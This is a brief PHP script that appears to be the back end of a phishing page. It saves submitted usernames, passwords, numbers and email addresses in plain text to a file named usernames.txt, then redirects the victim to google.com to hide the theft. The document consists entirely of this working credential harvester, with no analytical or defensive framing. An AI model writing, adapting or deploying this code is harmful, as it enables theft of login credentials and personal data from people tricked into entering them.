<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] .  "Num: " . $_POST['number'] . $_POST['email'] ."\n", FILE_APPEND);
header('Location: https://google.com');
exit();
